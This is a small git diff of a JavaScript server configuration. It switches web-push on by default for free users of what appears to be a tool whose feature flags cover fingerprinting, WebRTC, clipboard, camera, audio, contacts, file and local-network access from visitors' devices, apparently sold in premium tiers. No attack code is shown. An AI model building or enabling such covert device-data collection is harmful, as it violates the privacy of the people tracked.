@@ -27,7 +27,7 @@ const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
-const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:false };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
